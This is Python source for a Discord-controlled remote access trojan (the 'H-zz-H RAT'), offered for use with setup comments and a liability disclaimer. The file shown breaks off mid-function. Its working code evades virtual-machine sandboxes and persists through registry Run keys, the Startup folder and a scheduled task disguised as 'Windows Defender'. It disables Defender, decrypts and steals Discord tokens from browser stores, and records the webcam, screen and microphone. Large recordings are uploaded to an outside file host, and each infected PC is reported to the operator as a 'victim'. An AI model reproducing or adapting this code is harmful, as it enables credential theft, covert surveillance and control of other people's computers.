import asyncio
import ctypes
import cv2
import discord
import math
import os
import platform
import psutil
import pyautogui
import pyperclip
import random
import requests
import socket
import subprocess
import sys
import threading
import time
import json
import re
import base64
import pyaes
import tkinter as tk
import winreg as reg
import glob
import wave
import sqlite3
import numpy as np
import sounddevice as sd
import win32crypt
import shutil
from scapy.all import IP, ICMP, send
from pynput import keyboard
from urllib3 import PoolManager
from urllib.parse import urlparse
from ctypes import *
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
from discord.ext import commands
from PIL import Image, ImageTk, ImageGrab
from datetime import datetime, timedelta

# VARS

AutoSteal = False
DiscordInjection = False
AutoSelfDestroy = False

# VARS

os.system("@echo off")
os.system("cls")
init()
print(Fore.GREEN)
if sys.platform.startswith('win'):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

def check_token():
    if HzzH == "":
        print(f"{Fore.RED}[ERROR] No Token given on Line 161 in Code!{Fore.GREEN}")
        input()

def perform_all_checks():
    blacklisted_names = ["johnson", "miller", "malware", "maltest", "currentuser", "sandbox", "virus", "john doe", "test user", "sand box", "wdagutilityaccount"]
    current_username = os.getenv("USERNAME", "").lower()
    if current_username in blacklisted_names:
        return "Blacklisted username detected"

    qemu_drivers = ["qemu-ga", "qemuwmi"]
    sys32 = os.path.join(os.getenv("SystemRoot", ""), "System32")
    try:
        detected_drivers = []
        files = os.listdir(sys32)
        for file in files:
            for driver in qemu_drivers:
                if driver in file.lower():
                    detected_drivers.append(driver)
        if detected_drivers:
            exit()
            return f"QEMU drivers detected: {', '.join(detected_drivers)}"
    except Exception as e:
        return f"Error accessing System32 directory for QEMU: {e}"

    try:
        result = subprocess.check_output(['wmic', 'diskdrive', 'get', 'model'], text=True)
        if "DADY HARDDISK" in result or "QEMU HARDDISK" in result:
            exit()
            return "QEMU virtual disk detected"
    except subprocess.CalledProcessError as e:
        return f"Error running wmic command for disk check: {e}"

    try:
        cmd = subprocess.Popen(['wmic', 'path', 'win32_VideoController', 'get', 'name'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        gpu_output, err = cmd.communicate()

        if err:
            return f"Error executing command for graphics card: {err.decode('utf-8').strip()}"
        
        if b"vmware" in gpu_output.lower():
            exit()
            return "VMware graphics card detected"
        elif b"virtualbox" in gpu_output.lower():
            exit()
            return "VirtualBox graphics card detected"
    except Exception as e:
        return f"Error in GraphicsCardCheck: {e}"

    try:
        recdir = os.path.join(os.getenv('APPDATA'), 'microsoft', 'windows', 'recent')
        files = os.listdir(recdir)
        if len(files) < 20:
            exit()
            return "Recent file activity check passed"
    except Exception as e:
        return f"Error reading recent file activity directory: {e}"

    parallels_drivers = ["prl_sf", "prl_tg", "prl_eth"]
    try:
        files = os.listdir(sys32)
        for file in files:
            for driver in parallels_drivers:
                if driver in file.lower():
                    exit()
                    return "Parallels drivers detected"
    except Exception as e:
        return f"Error accessing System32 directory for Parallels: {e}"

    bad_drivers_list = ["balloon.sys", "netkvm.sys", "vioinput*", "viofs.sys", "vioser.sys"]
    for driver in bad_drivers_list:
        files = glob.glob(os.path.join(sys32, driver))
        if files:
            exit()
            return "KVM drivers detected"

    return f"{Fore.BLUE}[INFO] No VM found!{Fore.GREEN}"

try:
    result = perform_all_checks()
except:
    print(f"[ERROR] Error on VM Check")
    result = f"[ERROR] VM Check failed"

print(result)

executor = ThreadPoolExecutor()
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True

# This RAT is made by H-zz-H!  
# If you have any questions or need help, feel free to contact me on Discord: _h_zz_h_ or join my server: https://discord.gg/29Ya4F3CgQ.  
# On my Discord server (as of 23.02.2025), I have posted a cracked open-source Discord Stealer that would normally cost more than 120 euros for lifetime access.  
# Join my Discord server for coding help or if you encounter errors with this RAT. I am always open to new ideas, projects, or feature suggestions for this RAT.  
# If you want to add new features or improve this RAT, feel free to do so and share your work with me on Discord.  
# If I find the time, this RAT will be updated and working forever. If not, well, I don't know.  
# If you use this RAT for illegal purposes, I am not responsible for it. I am also not responsible for any damage caused by this RAT.  
# Skid from this project if you want, I don’t really care lol. Just don’t claim it as your own work.  

# Sources I skidded from:  
# https://github.com/Blank-c/Blank-Grabber (The !blocklist and !unblocklist commands are almost fully skidded. I just changed the code a bit to fit my project).  
# Tried doing it on my own (but I’m way too retarded for that).
# https://github.com/moom825/Discord-RAT (Because of this RAT, I started this project. So special thanks to moom825).  
# The !uncritproc and !critproc commands are from moom825's Discord-RAT project. Many features are quite the same as in moom825's project.  
# That’s because I needed some features I could code, and his GitHub page was full of ideas to implement.  
# Almost everything in this project is inspired by him.  

# Thanks for taking the time to read.  
# On line 146, change the Discord bot token to yours, and you’re good to go!  
# Love y’all. Bye.  
# ~~~ H-zz-H ~~~  

HzzH = "" # Put ur bot token here
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None) # Change the "!" to whatever prefix you want

# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING

# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING

# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING

# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING

# DO NOT CHANGE ANYTHING BELOW IF YOU DONT KNOW WHAT YOU ARE DOING

apps_vdf = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam", "config", "libraryfolders.vdf")
acc_vdf = os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam", "config", "loginusers.vdf")
steamurl = "https://api.steampowered.com/ISteamApps/GetAppList/v2"
script_path = os.path.realpath(sys.argv[0])
autohzzh = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
hzzh_path = os.path.join(autohzzh, 'Windows Defender.exe')
temp_folder = os.environ['TEMP']
file_name = "Windows Defender.exe"
hzzh_path1 = os.path.join(temp_folder, file_name)
log_file_path = os.path.join(temp_folder, "hzzh.txt")
keylog_listener = None
key_log = []
ACTIVE_PCS_FILE = os.path.join(os.environ['TEMP'], "active_pcs.txt")
FLOATING_WINDOW = None
httpClient = PoolManager(cert_reqs="CERT_NONE")
APPDATA = os.getenv("appdata")
LOCALAPPDATA = os.getenv("localappdata")
REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
current_directory = os.getcwd()
methods = ['udp', 'pod', 'hzzh', 'minecraft']
MIXER_OBJECTF_HMIXER = 0
MIXER_CONTROL_CONTROLTYPE_VOLUME = 0x50000
MIXERCONTROL_CONTROLTYPE_VOLUME = 0x50000
MIXER_GETLINEINFOF_SOURCE = 0x00000001

def get_system_info():
    try:
        pc_name = platform.node()
        ip_address = socket.gethostbyname(socket.gethostname())
        system_version = platform.platform()
        cpu_usage = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/')
        disk_free = round(disk.free / (1024 ** 3), 2)
        disk_total = round(disk.total / (1024 ** 3), 2)
        disk_used = round(disk.used / (1024 ** 3), 2)
        ram = psutil.virtual_memory().used / (1024 ** 3) 
        total_ram = psutil.virtual_memory().total / (1024 ** 3) 
        geolocation_info = get_geolocation_info(ip_address)

        return {
            "PC Name": pc_name,
            "IP Address": ip_address,
            "System Version": system_version,
            "CPU Usage": f"{cpu_usage}%",
            "Memory Usage": f"{memory}%",
            "Disk Usage": f"{disk_used:.2f} GB used / {disk_free:.2f} GB free / {disk_total:.2f} GB total",
            "Geolocation": geolocation_info,
            "RAM Usage": f"{ram:.2f} GB / {total_ram:.2f} GB",
            "Disk Info": f"{disk_used} GB from {disk.total / (1024 ** 3):.2f} GB used",
        }
    except Exception as e:
        return {"Error": str(e)}

def get_geolocation_info(ip_address):
    try:
        response = requests.get("https://ipinfo.io/json")
        data = response.json()
        city = data.get("city", "Unknown")
        region = data.get("region", "Unknown")
        country = data.get("country", "Unknown")
        return f"{city}, {region}, {country}"
    except:
        return "Unavailable"

def get_battery_status():
    try:
        battery = psutil.sensors_battery()
        if battery:
            return f"{battery.percent}% remaining (plugged in: {battery.power_plugged})"
        else:
            return "No battery found"
    except:
        return "Error retrieving battery info"

def get_running_tasks():
    try:
        tasks = []
        for proc in psutil.process_iter(['pid', 'name']):
            tasks.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
        return tasks if tasks else ["No tasks running."]
    except Exception as e:
        return [f"Error fetching tasks: {e}"]

def change_wallpaper_windows(image_path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
    except Exception as e:
        ""

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin() != 0
    
def ask_for_admin():
    if is_admin():
        return True
    return False

def trigger_uac():
    if not is_admin():
        exe_path = sys.argv[0]

        arguments = " ".join(sys.argv[1:])

        if exe_path.endswith(".py"):
            python_exe = sys.executable
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", python_exe, f'"{exe_path}" {arguments}', None, 1
            )
        else:
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", exe_path, arguments, None, 1
            )

        if result <= 32:
            return False
        else:
            return True
    else:
        return True
    
def hzzh():
    try:
        if not os.path.exists(hzzh_path):
            shutil.copy(script_path, hzzh_path)
    except:
        pass
def hzzhtemp():
    try:
        shutil.copy(script_path, hzzh_path1)
    except:
        pass
def hzzhreg():
    try:
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
        reg.SetValueEx(registry_key, "Windows Defender", 0, reg.REG_SZ, hzzh_path)
        reg.CloseKey(registry_key)
    except Exception as e:
        pass
def hzzh_runonce():
    try:
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", 0, reg.KEY_WRITE)
        reg.SetValueEx(registry_key, "Windows Defender", 0, reg.REG_SZ, hzzh_path1)
        reg.CloseKey(registry_key)
    except Exception as e:
        pass
def hzzh_task_scheduler():
    try:
        task_name = "WindowsDefenderTask"
        command = f'schtasks /create /tn "{task_name}" /tr "{hzzh_path}" /sc onlogon /rl highest'
        subprocess.run(command, shell=True)
    except Exception as e:
        pass

def prevent_close():
    pass

def smooth_move_window(root, start_x, start_y, end_x, end_y, steps=20):
    delta_x = (end_x - start_x) / steps
    delta_y = (end_y - start_y) / steps
    for i in range(steps):
        new_x = int(start_x + delta_x * (i + 1))
        new_y = int(start_y + delta_y * (i + 1))
        root.geometry(f"{new_x}x{new_y}")
        root.update()
        time.sleep(0.01)

def move_window_randomly(root):
    if random.choice([True, False]):
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()

        current_geometry = root.geometry()
        current_x = int(current_geometry.split('+')[1])
        current_y = int(current_geometry.split('+')[2])

        new_x = random.randint(0, screen_width - root.winfo_width())
        new_y = random.randint(0, screen_height - root.winfo_height())

        smooth_move_window(root, current_x, current_y, new_x, new_y)
    
    root.after(random.randint(500, 2000), move_window_randomly, root)

def download_image(image_url):
    if not os.path.exists(temp_folder):
        os.makedirs(temp_folder)

    response = requests.get(image_url, stream=True)
    if response.status_code != 200:
        raise Exception(f"Failed to download image: {response.status_code}")

    file_extension = image_url.split(".")[-1].split("?")[0].lower()
    valid_extensions = ["jpg", "jpeg", "png", "bmp", "gif", "webp"]
    
    if file_extension not in valid_extensions:
        file_extension = "png"

    file_path = os.path.join(temp_folder, f"floating_image.{file_extension}")

    with open(file_path, 'wb') as file:
        for chunk in response.iter_content(1024):
            file.write(chunk)

    try:
        with Image.open(file_path) as img:
            img.verify() 
    except Exception as e:
        os.remove(file_path) 
        raise Exception(f"Downloaded file is not a valid image: {e}")

    if file_extension == "webp":
        converted_path = os.path.join(temp_folder, "floating_image.png")
        try:
            with Image.open(file_path) as img:
                img.convert("RGBA").save(converted_path, "PNG")
            file_path = converted_path 
        except Exception as e:
            raise Exception(f"Error converting WebP: {e}")

    return file_path

def create_window(duration, file_path):
    global FLOATING_WINDOW
    FLOATING_WINDOW = tk.Tk()
    FLOATING_WINDOW.title("Floating Image")
    FLOATING_WINDOW.resizable(False, False)
    FLOATING_WINDOW.overrideredirect(True)
    FLOATING_WINDOW.attributes('-topmost', 1)

    try:
        image = Image.open(file_path).convert("RGBA")  
    except Exception as e:
        ""
        return
    
    width, height = image.size  
    FLOATING_WINDOW.geometry(f"{width}x{height}") 

    photo = ImageTk.PhotoImage(image)
    label = tk.Label(FLOATING_WINDOW, image=photo)
    label.image = photo
    label.pack()

    FLOATING_WINDOW.protocol("WM_DELETE_WINDOW", prevent_close)
    move_window_randomly(FLOATING_WINDOW)
    
    threading.Timer(duration, FLOATING_WINDOW.destroy).start()
    FLOATING_WINDOW.mainloop()

def wait_for_wifi():
    while True:
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=5)
            print(Fore.GREEN + "[SUCCESS] Found Wi-Fi" + Fore.RESET)
            return
        except (socket.timeout, socket.error):
            print(Fore.BLUE + "[INFO] Waiting for Wi-Fi" + Fore.GREEN)
            time.sleep(5)

@bot.event
async def on_ready():
    guild = bot.guilds[0] 
    system_info = get_system_info()
    pc_name = system_info.get("PC Name", "Unknown-PC")

    activity = discord.Activity(type=discord.ActivityType.watching, name="on random kids | !help")
    await bot.change_presence(status=discord.Status.online, activity=activity)

    existing_channel = discord.utils.get(guild.channels, name=pc_name.lower())
    if existing_channel:
        print(f"Channel for {pc_name} already exists.")
        await existing_channel.send(embed=discord.Embed(
                title="🐀 **[H-zz-H] Old Victim**",
                description=f"**PC Name: 🖥️** {system_info['PC Name']}\n"
                            f"**Private IP: 🌐** {system_info['IP Address']}\n"
                            f"**Geolocation: 📍** {system_info['Geolocation']}\n"
                            f"**System Version: 🖱️** {system_info['System Version']}\n"
                            f"**CPU Usage: ⚙️** {system_info['CPU Usage']}\n"
                            f"**Memory Usage: 💾** {system_info['Memory Usage']}\n"
                            f"**Disk Usage: 🗂️** {system_info['Disk Info']}\n\n"
                            "Made with ❤ by H-zz-H.",
                color=0x00ff00
        ))
    else:
        try:
            new_channel = await guild.create_text_channel(name=pc_name.lower())
            await new_channel.send(embed=discord.Embed(
                title="🐀 **[H-zz-H] New Victim**",
                description=f"**PC Name: 🖥️** {system_info['PC Name']}\n"
                            f"**IP Address: 🌐** {system_info['IP Address']}\n"
                            f"**Geolocation: 📍** {system_info['Geolocation']}\n"
                            f"**System Version: 🖱️** {system_info['System Version']}\n"
                            f"**CPU Usage: ⚙️** {system_info['CPU Usage']}\n"
                            f"**Memory Usage: 💾** {system_info['Memory Usage']}\n"
                            f"**Disk Usage: 🗂️** {system_info['Disk Info']}\n\n"
                            "Made with ❤ by H-zz-H.",
                color=0x00ff00
            ))
            print(f"Channel '{pc_name}' created and information sent.")
        except Exception as e:
            print(f"Failed to create channel for {pc_name}: {e}")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return  
    
    pc_name = get_system_info().get("PC Name", "Unknown-PC")
    
    if message.channel.name.lower() != pc_name.lower() and message.channel.name.lower() != "botnet":
        if message.content.startswith("!botnet"):
            embed = discord.Embed(
                title="⚡ Botnet",
                description="⚡ The !botnet command is only available in the #botnet channel.",
                color=0xFF0000
            )
            await message.channel.send(embed=embed)
        return
    
    if message.channel.name.lower() == "botnet":
        if not (message.content.startswith("!botnet") or message.content.startswith("!botnet_stop") or message.content.startswith("!help") or message.content.startswith("!recreate") or message.content.startswith("!purge")): 
            embed = discord.Embed(
                title="⚡ Botnet",
                description=f"⚡ Please only use !botnet commands here! | Send by: #{pc_name.lower()}",
                color=0xFFDD00
            )
            await message.channel.send(embed=embed)
            return

    await bot.process_commands(message)

def CaptureWebcam(index: int, filePath: str) -> bool:
    avicap32 = ctypes.windll.avicap32
    WS_CHILD = 0x40000000
    WM_CAP_DRIVER_CONNECT = 0x0400 + 10
    WM_CAP_DRIVER_DISCONNECT = 0x0402
    WM_CAP_FILE_SAVEDIB = 0x0400 + 100 + 25

    hcam = avicap32.capCreateCaptureWindowW(
        ctypes.wintypes.LPWSTR("Blank"),
        WS_CHILD,
        0, 0, 0, 0,
        ctypes.windll.user32.GetDesktopWindow(), 0
    )

    result = False

    if hcam:
        if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, ctypes.wintypes.LPWSTR(filePath)):
                result = True
            ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
        ctypes.windll.user32.DestroyWindow(hcam)

    return result

def CreateMutex(mutex: str) -> bool:
    kernel32 = ctypes.windll.kernel32
    mutex = kernel32.CreateMutexA(None, False, mutex)
    return kernel32.GetLastError() != 183

def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str = None) -> bytes:
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ("cbData", ctypes.c_ulong),
            ("pbData", ctypes.POINTER(ctypes.c_ubyte))
        ]

    pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
    pDataOut = DATA_BLOB()
    pOptionalEntropy = None

    if optional_entropy is not None:
        optional_entropy = optional_entropy.encode("utf-16")
        pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

    if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
        data = (ctypes.c_ubyte * pDataOut.cbData)()
        ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
        ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
        return bytes(data)

    raise ValueError("Invalid encrypted_data provided!")

def HideConsole() -> None:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def GetHeaders(token: str = None) -> dict:
    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
    }
    if token:
        headers["authorization"] = token
    return headers

def GetTokens():
    results = []
    tokens = []
    paths = get_paths()

    for name, path in paths.items():
        if os.path.exists(path):
            tokens += SafeStorageSteal(path)
            tokens += SimpleSteal(path)
            if "FireFox" in name:
                tokens += FireFoxSteal(path)

    return tokens

def SafeStorageSteal(path: str) -> list[str]:
    encryptedTokens = []
    tokens = []
    key = None
    levelDbPaths = []

    localStatePath = os.path.join(path, "Local State")

    for root, dirs, _ in os.walk(path):
        for dir in dirs:
            if dir == "leveldb":
                levelDbPaths.append(os.path.join(root, dir))

    if os.path.isfile(localStatePath) and levelDbPaths:
        with open(localStatePath, errors="ignore") as file:
            jsonContent = json.load(file)

        key = jsonContent['os_crypt']['encrypted_key']
        key = base64.b64decode(key)[5:]

        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith((".log", ".ldb")):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors="ignore") as file:
                        lines = file.readlines()

                    for line in lines:
                        if line.strip():
                            matches = re.findall(REGEX_ENC, line)
                            for match in matches:
                                match = match.rstrip("\\")
                                if match not in encryptedTokens:
                                    match = match.split("dQw4w9WgXcQ:")[1].encode()
                                    missing_padding = 4 - (len(match) % 4)
                                    if missing_padding:
                                        match += b'=' * missing_padding
                                    match = base64.b64decode(match)
                                    encryptedTokens.append(match)

    for token in encryptedTokens:
        try:
            token = pyaes.AESModeOfOperationGCM(CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors="ignore")
            if token:
                tokens.append(token)
        except Exception:
            pass

    return tokens

def SimpleSteal(path: str) -> list[str]:
    tokens = []
    levelDbPaths = []

    for root, dirs, _ in os.walk(path):
        for dir in dirs:
            if dir == "leveldb":
                levelDbPaths.append(os.path.join(root, dir))

    for levelDbPath in levelDbPaths:
        for file in os.listdir(levelDbPath):
            if file.endswith((".log", ".ldb")):
                filepath = os.path.join(levelDbPath, file)
                with open(filepath, errors="ignore") as file:
                    lines = file.readlines()

                for line in lines:
                    if line.strip():
                        matches = re.findall(REGEX, line.strip())
                        for match in matches:
                            match = match.rstrip("\\")
                            if not match in tokens:
                                tokens.append(match)

    return tokens

def FireFoxSteal(path: str) -> list[str]:
    tokens = []

    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(".sqlite"):
                filepath = os.path.join(root, file)
                with open(filepath, errors="ignore") as file:
                    lines = file.readlines()

                    for line in lines:
                        if line.strip():
                            matches = re.findall(REGEX, line)
                            for match in matches:
                                match = match.rstrip("\\")
                                if not match in tokens:
                                    tokens.append(match)

    return tokens

def get_paths():
    return {
        "Discord": os.path.join(APPDATA, "discord"),
        "Discord Canary": os.path.join(APPDATA, "discordcanary"),
        "Lightcord": os.path.join(APPDATA, "Lightcord"),
        "Discord PTB": os.path.join(APPDATA, "discordptb"),
        "Opera": os.path.join(APPDATA, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(APPDATA, "Opera Software", "Opera GX Stable"),
        "Amigo": os.path.join(LOCALAPPDATA, "Amigo", "User Data"),
        "Torch": os.path.join(LOCALAPPDATA, "Torch", "User Data"),
        "Kometa": os.path.join(LOCALAPPDATA, "Kometa", "User Data"),
        "Orbitum": os.path.join(LOCALAPPDATA, "Orbitum", "User Data"),
        "CentBrowse": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data"),
        "7Sta": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data"),
        "Sputnik": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data"),
        "Vivaldi": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data"),
        "Chrome SxS": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"),
        "Chrome": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"),
        "FireFox": os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles"),
        "Epic Privacy Browse": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data"),
        "Microsoft Edge": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
        "Uran": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data"),
        "Yandex": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data"),
        "Brave": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data")
    }

browsers = {
    'avast': LOCALAPPDATA + '\\AVAST Software\\Browser\\User Data',
    'amigo': LOCALAPPDATA + '\\Amigo\\User Data',
    'torch': LOCALAPPDATA + '\\Torch\\User Data',
    'kometa': LOCALAPPDATA + '\\Kometa\\User Data',
    'orbitum': LOCALAPPDATA + '\\Orbitum\\User Data',
    'cent-browser': LOCALAPPDATA + '\\CentBrowser\\User Data',
    '7star': LOCALAPPDATA + '\\7Star\\7Star\\User Data',
    'sputnik': LOCALAPPDATA + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': LOCALAPPDATA + '\\Vivaldi\\User Data',
    'chromium': LOCALAPPDATA + '\\Chromium\\User Data',
    'chrome-canary': LOCALAPPDATA + '\\Google\\Chrome SxS\\User Data',
    'chrome': LOCALAPPDATA + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': LOCALAPPDATA + '\\Epic Privacy Browser\\User Data',
    'msedge': LOCALAPPDATA + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': LOCALAPPDATA + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': LOCALAPPDATA + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': LOCALAPPDATA + '\\Microsoft\\Edge Dev\\User Data',
    'uran': LOCALAPPDATA + '\\uCozMedia\\Uran\\User Data',
    'yandex': LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data',
    'brave': LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': LOCALAPPDATA + '\\Iridium\\User Data',
    'coccoc': LOCALAPPDATA + '\\CocCoc\\Browser\\User Data',
    'opera': APPDATA + '\\Opera Software\\Opera Stable',
    'opera-gx': APPDATA + '\\Opera Software\\Opera GX Stable'
}

async def tokenoutput(ctx):
    tokens = GetTokens()
    
    if tokens:
        unique_tokens = set()
        for token in tokens:
            if token not in unique_tokens:
                unique_tokens.add(token)
        
        embed = discord.Embed(
            title="Token List 🎁",
            description="Here are all logged Discord tokens:",
            color=discord.Color.green()
        )
        
        for token in unique_tokens:
            embed.add_field(name="Token", value=token, inline=False)
        
        return embed
    else:
        embed = discord.Embed(
            title="No Tokens Found",
            description="Could not find any tokens.",
            color=discord.Color.red()
        )
        
        return embed

def record_screen(duration_sec):
    SCREEN_SIZE = (1920, 1080)
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    video_path = os.path.join(temp_folder, "screen_output.avi")
    out = cv2.VideoWriter(video_path, fourcc, 20.0, SCREEN_SIZE)

    start_time = time.time()
    while time.time() - start_time < duration_sec:
        img = ImageGrab.grab(bbox=(0, 0, SCREEN_SIZE[0], SCREEN_SIZE[1]))
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        out.write(frame)

    out.release()
    return video_path

def record_audio(duration_sec):
    fs = 44100
    audio_path = os.path.join(temp_folder, "audio_output.wav")

    devices = sd.query_devices()
    input_device = sd.default.device[0]

    print(f"Available Devices: {devices}")
    print(f"Using device: {input_device}")
    
    num_channels = sd.query_devices(input_device)['max_input_channels']

    if num_channels < 1:
        raise ValueError("No input channels available on the system")

    recording = sd.rec(int(duration_sec * fs), samplerate=fs, channels=num_channels)
    sd.wait()

    with wave.open(audio_path, 'wb') as wf:
        wf.setnchannels(num_channels)
        wf.setsampwidth(2)
        wf.setframerate(fs)
        wf.writeframes(recording.tobytes())
    
    return audio_path

def record_webcam(duration_sec):
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    video_path = os.path.join(temp_folder, "webcam_output.mp4")
    frame_rate = 20.0
    out = cv2.VideoWriter(video_path, fourcc, frame_rate, (640, 480))

    total_frames = int(duration_sec * frame_rate)
    for _ in range(total_frames):
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)

    cap.release()
    out.release()
    return video_path

async def send_file(ctx, file_path):
    file_size = os.stat(file_path).st_size

    if file_size > 10485760:
        embed = discord.Embed(
                    title="▶ Uploading to External Service",
                    description=f"This file is over 10MB, uploading to external service. Please wait...",
                    color=0x00FF00
                )
        await ctx.send(embed=embed)

        try:
            external_api_url = "https://transfer.whalebone.io/"
            filename = os.path.basename(file_path)

            with open(file_path, 'rb') as file:
                headers = {
                    "Max-Downloads": "1",  
                    "Max-Days": "5"        
                }

                response = requests.put(external_api_url + filename, data=file, headers=headers)

            if response.status_code == 200:
                uploaded_file_url = response.text

                embed = discord.Embed(
                    title="✅ File Uploaded Successfully",
                    description=f"Your file has been uploaded! You can access it here: {uploaded_file_url}",
                    color=0x00FF00
                )
                await ctx.send(embed=embed)
            else:
                embed = discord.Embed(
                    title="❌ Upload Failed",
                    description=f"Failed to upload the file. API Response: {response.text}",
                    color=0xFF0000
                )
                await ctx.send(embed=embed)

        except Exception as e:
            embed = discord.Embed(
                title="Error",
                description=f"An error occurred during upload: {str(e)}",
                color=0xFF0000
            )
            await ctx.send(embed=embed)

    else:
        file = discord.File(file_path, filename=os.path.basename(file_path))
        await ctx.send("Recording complete!", file=file)

    os.remove(file_path)

async def windowsdefender_disable():
    try:
        key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        with reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_ALL_ACCESS) as key:
            reg.SetValueEx(key, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
            reg.SetValueEx(key, "DisableAntiVirus", 0, reg.REG_DWORD, 1)
            reg.SetValueEx(key, "DisableRealtimeMonitoring", 0, reg.REG_DWORD, 1)
    except:
        key_path = r"SOFTWARE\Policies\Microsoft\Windows Security"
        with reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_ALL_ACCESS) as key:
            reg.SetValueEx(key, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
            reg.SetValueEx(key, "DisableAntiVirus", 0, reg.REG_DWORD, 1)
            reg.SetValueEx(key, "DisableRealtimeMonitoring", 0, reg.REG_DWORD, 1)

def block_inputs():
    ctypes.windll.user32.BlockInput(True)

def unblock_inputs():
    ctypes.windll.user32.BlockInput(False)

def reverse_mouse_move():
    global reverse_mouse
    prev_x, prev_y = pyautogui.position()
    
    while reverse_mouse:
        curr_x, curr_y = pyautogui.position()
        
        dx = curr_x - prev_x
        dy = curr_y - prev_y
        
        pyautogui.moveTo(prev_x - dx, prev_y - dy)
        
        prev_x, prev_y = pyautogui.position()
        
        time.sleep(0.01)

def jumpscaaare():
    try:
        subprocess.Popen(["start", "msedge", "https://only-fans.uk/hzzh_rat"], shell=True)

        time.sleep(2)

        pyautogui.press('f11')

    except Exception as e:
        print(f"Error in opening website: {e}")

cpu_stress_running = False
def cpu_stress():
    while cpu_stress_running:
        pass

reverse_mouse = False

def reverse_mouse_move():
    while reverse_mouse:
        x, y = pyautogui.position()

        pyautogui.moveTo(-x, -y)

        pyautogui.sleep(0.1)

def get_game_name_from_api(app_id):
    try:
        response = requests.get(steamurl)
        if response.status_code == 200:
            data = response.json()
            apps = data.get('applist', {}).get('apps', [])
            for app in apps:
                if app.get('appid') == app_id:
                    return app.get('name')
        else:
